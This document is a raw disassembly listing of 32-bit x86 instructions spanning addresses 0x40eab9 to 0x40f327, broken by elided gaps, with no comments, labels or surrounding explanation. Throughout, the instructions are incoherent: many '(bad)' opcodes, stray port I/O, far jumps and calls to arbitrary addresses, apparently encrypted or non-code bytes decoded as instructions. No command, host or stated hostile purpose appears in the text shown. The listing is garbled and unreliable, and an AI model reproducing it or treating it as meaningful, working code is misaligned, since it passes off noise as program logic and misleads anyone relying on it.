  40eab9:	lock sub ax,0xff51
  40eabe:	popa   
  40eabf:	jp     0x40eb34
  40eac1:	call   0x2cef27
	...
  40eada:	add    BYTE PTR [ebx+0x6f],bl
  40eadd:	out    0x2c,al
  40eadf:	aas    
  40eae0:	jp     0x40eadf
  40eae2:	or     edi,DWORD PTR [esi+0x7e681b03]
  40eae8:	(bad)  
  40eae9:	out    dx,al
  40eaea:	mov    esi,0xe80804a1
  40eaef:	pop    ebx
  40eaf0:	in     al,0xfe
  40eaf2:	jmp    DWORD PTR [ecx-0x140017fc]
  40eaf8:	pop    ebx
  40eaf9:	std    
  40eafa:	jne    0x40eb52
  40eafc:	addr16 pop ebx
  40eafe:	push   ebp
  40eaff:	push   ecx
  40eb00:	imul   edi,ebp,0x75
  40eb03:	push   edx
  40eb04:	push   0x6b415894
  40eb09:	std    
  40eb0a:	jne    0x40eb6a
  40eb0c:	data16 stc 
  40eb0e:	dec    edi
  40eb0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb10:	lods   al,BYTE PTR ds:[esi]
  40eb11:	xchg   esi,eax
  40eb12:	mov    bl,dl
  40eb14:	lods   eax,DWORD PTR ds:[esi]
  40eb15:	mov    dl,BYTE PTR [ecx]
  40eb17:	sub    dh,dl
  40eb19:	(bad)  
  40eb1a:	(bad)  
  40eb1b:	jne    0x40eaae
  40eb1d:	xchg   ebp,eax
  40eb1e:	je     0x40eb3b
  40eb20:	rcr    DWORD PTR [edx],0x58
  40eb23:	adc    BYTE PTR [esp+ecx*8-0x3f],ah
  40eb27:	fwait
  40eb28:	test   eax,0x74138b2f
  40eb2d:	adc    BYTE PTR [edi+ecx*1],cl
  40eb30:	xor    BYTE PTR [eax],bh
  40eb32:	push   eax
  40eb34:	lahf   
  40eb35:	ret    0xbe73
  40eb38:	icebp  
  40eb39:	jecxz  0x40eb7f
  40eb3b:	test   ax,0xe832
	...
  40eb53:	add    BYTE PTR [edi-0x13],dh
  40eb56:	xchg   esi,eax
  40eb57:	(bad)  
  40eb58:	ja     0x40eb5b
  40eb5a:	inc    ebp
  40eb5b:	mov    edi,0x2aa967
  40eb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb61:	inc    esp
  40eb62:	push   esi
  40eb63:	addr16 jno 0x40ebcc
  40eb66:	inc    ebx
  40eb67:	add    BYTE PTR [edi+0x44],dl
  40eb6a:	adc    DWORD PTR [eax],ecx
  40eb6c:	mov    edi,0xa0ff19b0
  40eb71:	xor    al,0xd7
  40eb73:	push   edi
  40eb74:	cwde   
  40eb75:	fst    DWORD PTR [esi+0x7e43a374]
  40eb7b:	pop    ebx
  40eb7c:	mov    cl,ch
  40eb7e:	or     al,al
  40eb80:	sti    
  40eb81:	mov    dl,0x2a
  40eb83:	daa    
  40eb84:	loop   0x40ebe0
  40eb86:	add    dl,BYTE PTR [eax+0x7f]
  40eb89:	xchg   ebp,eax
  40eb8a:	jmp    FWORD PTR ss:[eax+0x6c]
  40eb8e:	sub    al,BYTE PTR [ecx+0x20]
  40eb91:	pop    esp
  40eb92:	add    ch,BYTE PTR [eax-0x59]
  40eb95:	fwait
  40eb96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb97:	mov    ebp,0x413f59bf
  40eb9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb9d:	add    bh,BYTE PTR [ecx]
  40eb9f:	xchg   edi,eax
  40eba0:	mov    ebx,0xbdd2d0fa
  40eba5:	xchg   ecx,eax
  40eba6:	aad    0xab
  40eba8:	sahf   
  40eba9:	sub    cl,dh
  40ebab:	xchg   esi,eax
  40ebac:	pop    edi
  40ebad:	(bad)
  40ebb0:	jp     0x40ec2f
  40ebb2:	int3   
  40ebb3:	and    ah,0x8e
  40ebb6:	inc    edx
  40ebb7:	add    al,0x0
	...
  40ebcd:	jge    0x40eb9d
  40ebcf:	lods   eax,DWORD PTR ds:[esi]
  40ebd0:	adc    BYTE PTR [edi+0x30d49a],bl
  40ebd6:	xchg   edx,eax
  40ebd7:	outs   dx,DWORD PTR ds:[esi]
  40ebd8:	inc    eax
  40ebd9:	sti    
  40ebda:	sbb    al,0xf3
  40ebdc:	xchg   esi,eax
  40ebdd:	jnp    0x40ebd9
  40ebdf:	adc    BYTE PTR [ebx],0xe8
  40ebe2:	xchg   ecx,eax
  40ebe3:	test   DWORD PTR [ecx],ebp
  40ebe5:	test   BYTE PTR [ecx+0x28cf0bf3],dl
  40ebeb:	jbe    0x40eb83
  40ebed:	rcr    DWORD PTR [ecx*8+0x50fa5396],1
  40ebf4:	aaa    
  40ebf5:	rcl    BYTE PTR [ecx-0x71cc69a3],0x55
  40ebfc:	adc    BYTE PTR [edi-0x57cf5966],bl
  40ec02:	xchg   ecx,eax
  40ec03:	das    
  40ec04:	shl    DWORD PTR [edx+eax*1-0x6e73756c],0xbb
  40ec0c:	pop    es
  40ec0d:	jg     0x40ec09
  40ec0f:	mov    WORD PTR [esi+0xf28fd89],ss
  40ec15:	retf   
  40ec16:	sbb    ch,BYTE PTR [eax+eax*2-0x5446fd1a]
  40ec1d:	adc    ebp,DWORD PTR ds:0x1ad8960e
  40ec23:	jmp    0x90913c2b
  40ec28:	and    esp,edx
  40ec2a:	inc    ebx
  40ec2b:	add    cl,ch
  40ec2d:	xchg   esp,eax
  40ec2e:	xchg   ecx,eax
  40ec2f:	je     0x40ec12
	...
  40ec45:	add    ah,bh
  40ec47:	and    eax,0xa91ae67c
  40ec4c:	nop
  40ec4d:	adc    dl,BYTE PTR ss:[eax+0x2a3abc8]
  40ec54:	push   ebp
  40ec55:	(bad)  
  40ec56:	inc    DWORD PTR [ebx+0x2cdc5c3]
  40ec5c:	push   0xfffffffc
  40ec5e:	xor    edx,DWORD PTR [esi]
  40ec60:	or     cl,al
  40ec62:	jbe    0x40ec99
  40ec64:	jmp    FWORD PTR [esi+0x13fc461c]
  40ec6a:	std    
  40ec6b:	(bad)  
  40ec6c:	je     0x40ec5f
  40ec6e:	dec    esp
  40ec6f:	pop    ebx
  40ec70:	(bad)  
  40ec71:	xchg   esi,eax
  40ec72:	sbb    bl,BYTE PTR [ebx]
  40ec74:	and    ecx,DWORD PTR [esi+0x49e7fa98]
  40ec7a:	cmp    dl,BYTE PTR [eax-0x7020ec02]
  40ec80:	je     0x40ec63
  40ec82:	cld    
  40ec83:	jbe    0x40ec83
  40ec85:	outs   dx,BYTE PTR ds:[esi]
  40ec86:	xor    dl,BYTE PTR [eax+0x161a6574]
  40ec8c:	or     BYTE PTR [ecx-0x20],dl
  40ec8f:	xor    al,0xff
  40ec91:	push   esi
  40ec92:	fadd   st(2),st
  40ec94:	add    ebp,ecx
  40ec96:	jns    0x40ed15
  40ec98:	jmp    0x40ed04
  40ec9a:	addr16 cwde 
  40ec9c:	push   esi
  40ec9d:	shl    DWORD PTR [esp+ebx*1-0x55fc9c2],cl
  40eca4:	out    0xb9,eax
  40eca6:	mov    eax,0x70fe8f
	...
  40ecbf:	ror    BYTE PTR [esi-0x17d22376],0x40
  40ecc6:	jmp    0x9540bdef
  40eccb:	stos   DWORD PTR es:[edi],eax
  40eccc:	sbb    ch,BYTE PTR [eax+0x0]
  40eccf:	adc    eax,DWORD PTR [ebp+0x0]
  40ecd2:	push   edi
  40ecd3:	mov    dh,0x29
  40ecd5:	sub    BYTE PTR [eax],al
  40ecd7:	ds sti 
  40ecd9:	mov    edi,0xe7df6474
  40ecde:	fsubp  st(6),st
  40ece0:	jne    0x40ecdf
  40ece2:	or     ecx,DWORD PTR [esi]
  40ece4:	add    BYTE PTR [eax],ah
  40ece6:	mov    DWORD PTR [ebx+0x3e00666e],eax
  40ecec:	addr16 mov esp,0x40cfdf68
  40ecf2:	add    BYTE PTR [ecx+0x1],bl
  40ecf5:	clc    
  40ecf6:	call   ebx
  40ecf8:	(bad)  
  40ecf9:	out    0xc8,eax
  40ecfb:	aad    0x75
  40ecfd:	std    
  40ecfe:	jmp    DWORD PTR [ebx-0x4f0e1992]
  40ed04:	jne    0x40ed03
  40ed06:	cld    
  40ed07:	int    0xc3
  40ed09:	mov    bh,0xff
  40ed0b:	sbb    DWORD PTR [edi-0x3],esi
  40ed0e:	bnd js 0x40ecbc
  40ed11:	add    eax,0x73766775
  40ed16:	cld    
  40ed17:	pop    ecx
  40ed18:	add    BYTE PTR [eax],cl
  40ed1a:	call   0x3fbfcf
  40ed1f:	jmp    0x45ade0
	...
  40ed38:	into   
  40ed39:	loopne 0x40ecc5
  40ed3b:	in     al,dx
  40ed3c:	cmp    eax,0xe457e24f
  40ed41:	add    ebp,DWORD PTR [edx+0x3f]
  40ed44:	jmp    0xe728f549
  40ed49:	sar    dh,cl
  40ed4b:	inc    DWORD PTR [edi]
  40ed4d:	sar    ebx,1
  40ed4f:	mov    edi,DWORD PTR [ebx+0x7c]
  40ed52:	es inc ecx
  40ed54:	mov    es,WORD PTR [ebx-0x31edffc3]
  40ed5a:	addr16 jbe 0x40ed04
  40ed5d:	pop    esi
  40ed5e:	inc    ecx
  40ed5f:	add    al,dl
  40ed61:	add    DWORD PTR [eax+0x29],eax
  40ed64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed65:	cdq    
  40ed66:	pop    es
  40ed67:	rcl    bl,0xb3
  40ed6a:	sub    ebp,eax
  40ed6c:	leave  
  40ed6d:	jns    0x40ed02
  40ed6f:	(bad)  
  40ed70:	pushf  
  40ed71:	(bad)  [esi]
  40ed73:	and    BYTE PTR [esi],ch
  40ed75:	fimul  WORD PTR [ebx-0x5e665899]
  40ed7b:	mov    ebp,0x414938bf
  40ed80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed81:	rcr    BYTE PTR [eax],0xf8
  40ed84:	and    dh,cl
  40ed86:	sti    
  40ed87:	out    0x77,eax
  40ed89:	inc    esp
  40ed8a:	xchg   ebx,eax
  40ed8b:	(bad)  
  40ed8c:	adc    dh,cl
  40ed8e:	mov    esp,edi
  40ed90:	mov    ?,edi
  40ed92:	xchg   edx,eax
  40ed93:	inc    BYTE PTR [ebx]
  40ed95:	lods   al,BYTE PTR ds:[esi]
  40ed96:	ret    0xf8b8
  40ed99:	outs   dx,DWORD PTR ds:[esi]
  40ed9a:	xchg   edx,eax
  40ed9b:	inc    BYTE PTR [eax]
	...
  40edb1:	cmc    
  40edb2:	inc    esi
  40edb3:	int3   
  40edb4:	push   es
  40edb5:	jb     0x40ede9
  40edb7:	sbb    al,0x0
  40edb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edba:	js     0x40ee0d
  40edbc:	addr16 pop eax
  40edbe:	out    0x44,al
  40edc0:	add    BYTE PTR [edi],bh
  40edc2:	jno    0x40ee0c
  40edc4:	inc    ecx
  40edc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc6:	and    BYTE PTR [ecx],bl
  40edc8:	or     bh,cl
  40edca:	mov    dh,0xd
  40edcc:	(bad)  
  40edcd:	mov    eax,0x1f6802b2
  40edd2:	pop    esi
  40edd3:	inc    ebx
  40edd4:	add    BYTE PTR [edi],bh
  40edd6:	ins    BYTE PTR es:[edi],dx
  40edd7:	dec    eax
  40edd8:	inc    ecx
  40edd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edda:	inc    esp
  40eddb:	fldcw  WORD PTR [edi-0x32]
  40edde:	pop    edx
  40eddf:	add    ch,al
  40ede1:	cli    
  40ede2:	jb     0x40ed75
  40ede4:	(bad)  
  40ede5:	push   ds
  40ede6:	addr16 sahf 
  40ede8:	imul   esp,DWORD PTR [edi-0x1c876efe],0x341be943
  40edf2:	dec    eax
  40edf3:	test   al,0x3
  40edf5:	push   0xe7dc98d8
  40edfa:	add    dl,BYTE PTR [ecx]
  40edfc:	iret   
  40edfd:	dec    DWORD PTR [ebp-0x69148303]
  40ee03:	add    BYTE PTR [ebx],0xbf
  40ee06:	arpl   WORD PTR [ebx-0x65e558bc],sp
  40ee0c:	dec    eax
  40ee0d:	out    0x2,al
  40ee0f:	(bad)  
  40ee11:	rcr    bl,0x27
  40ee14:	add    al,0x0
	...
  40ee2a:	aas    
  40ee2b:	in     al,0x2f
  40ee2d:	xchg   ebx,eax
  40ee2e:	and    DWORD PTR [ebx+ebp*1-0x6c],edi
  40ee32:	sub    ecx,DWORD PTR [eax-0x3b]
  40ee35:	xor    edi,DWORD PTR [edi+0x58]
  40ee38:	sub    eax,DWORD PTR [ebp-0x59]
  40ee3b:	sbb    bh,BYTE PTR [edx+0x48]
  40ee3e:	data16 add ah,BYTE PTR [esi+0x27db88d8]
  40ee45:	add    al,0xff
  40ee47:	pop    es
  40ee48:	xor    BYTE PTR [ebx-0x63dc8417],dl
  40ee4e:	and    eax,0x53037d10
  40ee53:	cmp    ch,BYTE PTR [edx+0x10]
  40ee56:	xlat   BYTE PTR ds:[ebx]
  40ee57:	add    bh,ch
  40ee59:	inc    ebp
  40ee5a:	and    al,0x10
  40ee5c:	jge    0x40ee61
  40ee5e:	cmp    ecx,esi
  40ee60:	rol    BYTE PTR [edi+eiz*4],1
  40ee63:	popf   
  40ee64:	sahf   
  40ee65:	xchg   edx,eax
  40ee66:	cmp    edi,edx
  40ee68:	inc    eax
  40ee69:	aaa    
  40ee6a:	push   ebp
  40ee6b:	lea    ecx,[ebp-0x6e]
  40ee6e:	sbb    edx,DWORD PTR [edi-0x6550e7bb]
  40ee74:	xchg   ecx,eax
  40ee75:	xor    eax,0x35ff8d90
  40ee7a:	scas   eax,DWORD PTR es:[edi]
  40ee7b:	xchg   edx,eax
  40ee7c:	(bad)  
  40ee7d:	mov    ah,0x7c
  40ee7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee80:	lahf   
  40ee81:	mov    ebx,0x94fe8c15
  40ee86:	adc    BYTE PTR [esp+esi*2+0x51760ce1],cl
  40ee8d:	push   cs
	...
  40eea2:	add    BYTE PTR ds:0x350d748c,dh
  40eea8:	push   ss
  40eea9:	call   0xe83ba7ac
  40eeae:	xchg   edx,eax
  40eeaf:	xchg   edx,eax
  40eeb0:	(bad)  
  40eeb1:	(bad)  
  40eeb2:	out    dx,al
  40eeb3:	cwde   
  40eeb4:	sahf   
  40eeb5:	out    0x7d,eax
  40eeb7:	jo     0x40ee46
  40eeb9:	(bad)  
  40eeba:	ficomp WORD PTR [eax+0x7065e796]
  40eec0:	(bad)  
  40eec1:	dec    dh
  40eec3:	mov    eax,0xd06de792
  40eec8:	(bad)  
  40eec9:	(bad)  
  40eeca:	mov    esi,0x35e79ab8
  40eecf:	ror    BYTE PTR [ebp-0x71675102],1
  40eed5:	(bad)  
  40eed6:	sbb    al,0xfb
  40eed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eed9:	out    dx,al
  40eeda:	cmp    edx,DWORD PTR [esi]
  40eedc:	mov    WORD PTR [esi-0x60],ds
  40eedf:	loope  0x40eee1
  40eee1:	add    BYTE PTR [edx+eiz*2],dh
  40eee4:	cdq    
  40eee5:	sub    BYTE PTR [ebp+0x13001b37],0x6b
  40eeec:	lea    esi,[ecx+eiz*8+0x2c]
  40eef0:	jae    0x40ef43
  40eef2:	outs   dx,BYTE PTR ds:[esi]
  40eef3:	push   ss
  40eef4:	jp     0x40ef3a
  40eef6:	gs cdq 
  40eef8:	add    ch,BYTE PTR [edx-0x17]
  40eefb:	mov    WORD PTR [ebp+0x1aa4a844],fs
  40ef01:	add    cl,ch
  40ef03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef04:	and    bh,0x0
	...
  40ef1b:	add    BYTE PTR [edx-0x28],al
  40ef1e:	(bad)  
  40ef1f:	call   DWORD PTR [ebp+0x2e2372c0]
  40ef25:	push   0x71d15f01
  40ef2a:	or     eax,eax
  40ef2c:	sbb    bl,BYTE PTR [ecx+0x7e684e]
  40ef32:	out    dx,eax
  40ef33:	mov    esi,0x41436626
  40ef38:	dec    esi
  40ef39:	sar    dh,1
  40ef3b:	jne    0x40ef93
  40ef3d:	push   0x735179ef
  40ef42:	out    0x1d,al
  40ef44:	sub    esi,DWORD PTR [ebx-0x3]
  40ef47:	(bad)  
  40ef48:	mov    ebx,0x3675fd7b
  40ef4d:	push   0x7351528e
  40ef52:	mov    edx,0x8b55003a
  40ef58:	bound  eax,QWORD PTR [edi-0x1346033e]
  40ef5e:	jmp    FWORD PTR [ecx-0x41]
  40ef61:	jno    0x40efd6
  40ef63:	or     dh,ah
  40ef65:	mov    dh,0x50
  40ef67:	call   DWORD PTR [ecx+0x9]
  40ef6a:	inc    esp
  40ef6b:	cld    
  40ef6c:	jne    0x40ef2a
  40ef6e:	xchg   DWORD PTR [eax],ebp
  40ef70:	mov    edi,0xfe3f8006
  40ef75:	repz aas 
  40ef77:	push   0x4139cb
  40ef7c:	mov    ecx,0x277c6e
	...
  40ef95:	mov    esi,0xcac00aff
  40ef9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef9b:	push   ebp
  40ef9c:	call   0x3fc110
  40efa1:	mov    ch,0xbf
  40efa3:	jb     0x40efbe
  40efa5:	out    dx,al
  40efa6:	out    0xff,eax
  40efa8:	jmp    DWORD PTR [edi-0x5398aebc]
  40efae:	arpl   WORD PTR [ecx+0x0],ax
  40efb1:	test   DWORD PTR [esi+edx*1+0x8],0xff0a1c7f
  40efb9:	mov    BYTE PTR [ecx+0x4c],al
  40efbc:	push   ebx
  40efbd:	sbb    ah,0x8e
  40efc0:	xor    ah,BYTE PTR [edi+0x22]
  40efc3:	nop
  40efc4:	(bad)  
  40efc5:	jo     0x40efb3
  40efc7:	xchg   esp,eax
  40efc8:	lods   eax,DWORD PTR ds:[esi]
  40efc9:	scas   eax,DWORD PTR es:[edi]
  40efca:	pushf  
  40efcb:	adc    eax,0x8e7660c0
  40efd0:	(bad)  
  40efd1:	rcl    BYTE PTR [ecx-0x730ae066],cl
  40efd7:	mov    ds,WORD PTR [esi+0x5e]
  40efda:	xlat   BYTE PTR ds:[ebx]
  40efdb:	push   es
  40efdc:	add    dl,bl
  40efde:	and    BYTE PTR [edi+0x36a56382],bl
  40efe4:	push   0xffffffa7
  40efe6:	das    
  40efe7:	inc    edx
  40efe8:	push   DWORD PTR [edx+0x76c19aa1]
  40efee:	mov    esp,0xc562888e
  40eff3:	jp     0x40f031
  40eff5:	push   ds
  40eff6:	icebp  
  40eff7:	inc    esp
	...
  40f00c:	add    BYTE PTR [eax],al
  40f00e:	daa    
  40f00f:	xchg   esp,eax
  40f010:	add    dh,BYTE PTR [edi+eiz*2+0x41]
  40f014:	jmp    0x40f05b
  40f016:	cwd    
  40f018:	xor    eax,0x2c4a2e8
  40f01d:	add    BYTE PTR [ecx+ebx*2-0x7e87dce9],bl
  40f024:	rcr    DWORD PTR [ebp-0x28],cl
  40f027:	cmp    edx,0xffffffbf
  40f02a:	pop    ebx
  40f02b:	mov    ds:0x99a76832,al
  40f030:	popf   
  40f031:	mov    ebp,0x4144b74f
  40f036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f037:	add    bh,BYTE PTR [ecx+0x50fa3b8e]
  40f03d:	out    dx,al
  40f03e:	das    
  40f03f:	mov    edx,DWORD PTR [ebp-0x64]
  40f042:	out    dx,al
  40f043:	cs dec esi
  40f045:	(bad)  
  40f046:	pushf  
  40f047:	(bad)  
  40f048:	sub    BYTE PTR [ebp-0x6f],cl
  40f04b:	mov    bh,BYTE PTR ds:0xf059968f
  40f051:	push   es
  40f052:	cli    
  40f053:	ret    0xe2c2
  40f056:	cmp    BYTE PTR [edi-0x40],0x8e
  40f05a:	jno    0x40f05a
  40f05c:	sub    BYTE PTR [eax],bl
  40f05e:	ret    
  40f05f:	sbb    al,ch
  40f061:	inc    ebp
  40f062:	out    0x2,al
  40f064:	mov    ecx,0x62abf9b
  40f069:	(bad)  
  40f06a:	loopne 0x40f086
  40f06c:	jmp    0x808a2874
  40f071:	loope  0x40f073
	...
  40f087:	jmp    0xf110:0x3833e943
  40f08e:	fwait
  40f08f:	inc    edi
  40f090:	or     ebx,esi
  40f092:	mov    es,WORD PTR [eax-0x8]
  40f095:	cmp    al,0x8f
  40f097:	and    DWORD PTR ds:0x2a739c0a,ebx
  40f09d:	(bad)  
  40f09e:	mov    ds,WORD PTR [ebp-0x7f17cb3e]
  40f0a4:	into   
  40f0a5:	cs inc ebp
  40f0a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0a8:	xor    al,cl
  40f0aa:	cdq    
  40f0ab:	push   ecx
  40f0ac:	mov    DWORD PTR [ebp-0x16fd80cd],esp
  40f0b2:	sahf   
  40f0b3:	sub    bl,BYTE PTR [ebx]
  40f0b5:	retf   
  40f0b6:	inc    ebp
  40f0b7:	data16 add bh,BYTE PTR [ecx]
  40f0ba:	(bad)  
  40f0bb:	push   ebx
  40f0bc:	cli    
  40f0bd:	nop
  40f0be:	push   ecx
  40f0bf:	pop    eax
  40f0c0:	mov    DWORD PTR [ebp-0x65],edi
  40f0c3:	jmp    0x7489:0x31760035
  40f0ca:	ins    DWORD PTR es:[edi],dx
  40f0cb:	sub    DWORD PTR [edi],ecx
  40f0cd:	or     BYTE PTR [ecx+0x7b],dl
  40f0d0:	xor    edi,edi
  40f0d2:	pop    esi
  40f0d3:	jns    0x40f090
  40f0d5:	shr    ebp,0xa4
  40f0d8:	das    
  40f0d9:	mov    edi,DWORD PTR ds:0x74efc525
  40f0df:	fist   WORD PTR [edx-0x950c1b1]
  40f0e5:	out    0x9e,eax
  40f0e7:	ror    DWORD PTR [ecx+0xe2fe],cl
	...
  40f0fd:	add    BYTE PTR [eax],al
  40f0ff:	add    BYTE PTR [ebp+edx*1+0x32],ah
  40f103:	push   0xffffff97
  40f105:	xchg   BYTE PTR [ecx],al
  40f107:	xchg   edi,eax
  40f108:	test   DWORD PTR [esp+eax*2+0x11],edi
  40f10c:	mov    al,BYTE PTR [ebx+0xe46bd37]
  40f112:	sbb    DWORD PTR [esi],eax
  40f114:	scas   eax,DWORD PTR es:[edi]
  40f115:	repnz (bad) 
  40f117:	je     0x40f165
  40f119:	mov    eax,ds:0x88319925
  40f11e:	(bad)  
  40f11f:	je     0x40f149
  40f121:	mov    BYTE PTR [ecx+eiz*8+0x22],dh
  40f125:	push   cs
  40f126:	or     cl,dl
  40f128:	imul   esi,DWORD PTR [edx],0x3ea0d6ff
  40f12e:	lock cmp DWORD PTR [ebx],edi
  40f131:	dec    esi
  40f132:	pop    eax
  40f133:	(bad)  
  40f134:	and    bh,BYTE PTR [edx+0x2fa4edc1]
  40f13a:	mov    eax,ebp
  40f13c:	(bad)
  40f140:	mov    ds:0x98a6431c,eax
  40f145:	cli    
  40f146:	out    0x51,eax
  40f148:	mov    bl,0x89
  40f14a:	(bad)  
  40f14b:	pusha  
  40f14c:	push   0xbee96986
  40f151:	add    ch,BYTE PTR [eax+0x0]
  40f154:	jl     0x40f196
  40f156:	inc    ecx
  40f157:	add    BYTE PTR [esi+0x4e000004],dh
  40f15d:	data16 jo 0x40f1b6
  40f160:	dec    ecx
  40f161:	ja     0x40f16c
  40f163:	rol    BYTE PTR [eax],0x0
	...
  40f176:	add    BYTE PTR [eax],al
  40f178:	add    dl,dl
  40f17a:	mov    ch,0x87
  40f17c:	inc    ebp
  40f17d:	inc    esi
  40f17e:	out    0x8d,al
  40f180:	inc    esi
  40f181:	dec    edi
  40f182:	add    al,0xff
  40f184:	jne    0x40f17c
  40f186:	data16 loopne 0x40f1ae
  40f189:	jle    0x40f18f
  40f18b:	or     eax,eax
  40f18d:	push   edx
  40f18e:	mov    ds:0x66b675fd,eax
  40f193:	add    DWORD PTR [ebp-0x37],ebx
  40f196:	jne    0x40f1e6
  40f198:	push   0x3eba9c
  40f19d:	push   ss
  40f19e:	add    al,0x0
  40f1a0:	out    dx,eax
  40f1a1:	clc    
  40f1a2:	in     al,dx
  40f1a3:	dec    DWORD PTR [edi-0x57]
  40f1a6:	out    dx,eax
  40f1a7:	pop    es
  40f1a8:	call   0x3fdfc3
  40f1ad:	mov    dh,0x95
  40f1af:	push   ecx
  40f1b0:	(bad)  
  40f1b1:	cmp    DWORD PTR [edi+0x73],esi
  40f1b4:	clc    
  40f1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b6:	lea    edx,[ecx-0x1]
  40f1b9:	dec    ecx
  40f1ba:	ja     0x40f22f
  40f1bc:	cld    
  40f1bd:	dec    ecx
  40f1be:	icebp  
  40f1bf:	pop    es
  40f1c0:	call   0x3fc549
  40f1c5:	inc    edi
  40f1c6:	ret    0x2
  40f1c9:	mov    bl,0x9
  40f1cb:	jmp    0x40f150
  40f1cd:	inc    edx
  40f1ce:	js     0x40f238
  40f1d0:	add    BYTE PTR [edx+edi*1-0x1],ah
  40f1d4:	jne    0x40f1dc
  40f1d6:	ins    BYTE PTR es:[edi],dx
  40f1d7:	sub    al,0x50
  40f1d9:	dec    ecx
  40f1da:	ja     0x40f163
  40f1dc:	inc    ebp
	...
  40f1f1:	add    BYTE PTR [edx],cl
  40f1f3:	in     al,dx
  40f1f4:	(bad)  
  40f1f5:	jmp    DWORD PTR [edi+0x6674c80]
  40f1fb:	loopne 0x40f23f
  40f1fd:	add    BYTE PTR [edi],bh
  40f1ff:	daa    
  40f200:	inc    ebp
  40f201:	inc    ecx
  40f202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f203:	or     BYTE PTR [esi],dl
  40f205:	or     bh,cl
  40f207:	pop    es
  40f208:	adc    al,0xff
  40f20a:	mov    eax,0xb0fc1618
  40f20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f210:	cli    
  40f211:	out    0x58,eax
  40f213:	dec    ecx
  40f214:	mov    edi,esi
  40f216:	outs   dx,BYTE PTR ds:[esi]
  40f217:	fild   DWORD PTR [esi]
  40f219:	add    dl,dh
  40f21b:	and    al,0x9f
  40f21d:	sub    BYTE PTR [ebx+0x41],0x1b
  40f221:	add    BYTE PTR [edi-0x501b2c8],ah
  40f227:	mov    eax,ds:0xd8e8429a
  40f22c:	mov    edi,esi
  40f22e:	cli    
  40f22f:	lea    ecx,[ebx+0x68f19f74]
  40f235:	dec    esi
  40f236:	pusha  
  40f237:	lock mov esi,DWORD PTR [edi+esi*4-0x8]
  40f23c:	adc    eax,0x3c103f08
  40f241:	dec    DWORD PTR [eax-0x78]
  40f244:	adc    al,0x18
  40f246:	inc    eax
  40f247:	push   es
  40f248:	idiv   esi
  40f24a:	mov    dl,0xa1
  40f24c:	call   0x4767:0x8aa0e054
  40f253:	fild   WORD PTR [eax+eax*1+0x0]
	...
  40f26b:	and    BYTE PTR [esi],ah
  40f26d:	hlt    
  40f26e:	out    0xc2,eax
  40f270:	inc    BYTE PTR [ebx]
  40f272:	add    BYTE PTR [ecx+ebx*2-0x44809af0],bl
  40f279:	inc    ecx
  40f27a:	inc    ecx
  40f27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f27c:	ror    DWORD PTR [edx],0x23
  40f27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f280:	cdq    
  40f281:	jnp    0x40f2c7
  40f283:	out    dx,eax
  40f284:	add    DWORD PTR [ecx],edx
  40f286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f287:	bound  eax,QWORD PTR [ecx-0x17]
  40f28a:	mov    bl,BYTE PTR [ebx-0xe]
  40f28d:	add    BYTE PTR [ebx],0x82
  40f290:	add    ch,cl
  40f292:	(bad)  
  40f293:	adc    BYTE PTR [esi],cl
  40f295:	out    dx,eax
  40f296:	push   es
  40f297:	bound  ecx,QWORD PTR [edx-0x7868be91]
  40f29d:	sti    
  40f29e:	repz shl BYTE PTR [ecx+eax*1-0x75],0xb1
  40f2a4:	and    BYTE PTR [eax-0x75],0x34
  40f2a8:	into   
  40f2a9:	outs   dx,DWORD PTR ds:[esi]
  40f2aa:	inc    ecx
  40f2ab:	mov    ds:0x8803e81b,eax
  40f2b0:	inc    ebp
  40f2b1:	dec    ebp
  40f2b2:	adc    DWORD PTR [edi-0x77c5cc66],ebx
  40f2b8:	xchg   BYTE PTR ds:0xbb85b311,bh
  40f2be:	sti    
  40f2bf:	sbb    bh,0x9d
  40f2c2:	mov    dh,BYTE PTR [ecx-0x7a]
  40f2c5:	fwait
  40f2c6:	xchg   DWORD PTR [ecx+0x10],ebp
  40f2c9:	icebp  
  40f2ca:	fwait
  40f2cb:	sbb    DWORD PTR ds:0x8b16,esi
	...
  40f2e1:	add    BYTE PTR [eax],al
  40f2e3:	add    BYTE PTR [ecx+0x10],bl
  40f2e6:	icebp  
  40f2e7:	mov    bl,bl
  40f2e9:	out    dx,al
  40f2ea:	add    eax,0x1d9a9f11
  40f2ef:	cmp    al,BYTE PTR [eax-0x7a]
  40f2f2:	pop    ds
  40f2f3:	(bad)  
  40f2f4:	xchg   esp,eax
  40f2f5:	add    dl,BYTE PTR [esi+edi*2-0x74537dc4]
  40f2fc:	rol    BYTE PTR [ecx+0x43d2a61b],cl
  40f302:	jmp    0x6a47860a
  40f307:	enter  0xd4f2,0x27
  40f30b:	add    al,0xa7
  40f30d:	push   cs
  40f30e:	cmp    al,BYTE PTR [edi+0x30c3]
  40f314:	bound  eax,QWORD PTR [edx]
  40f316:	add    BYTE PTR ds:0xa544bd91,dh
  40f31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f31d:	add    al,BYTE PTR [eax]
  40f31f:	jmp    0xea393209
  40f324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f325:	add    al,BYTE PTR [eax]
  40f327:	pop    esp
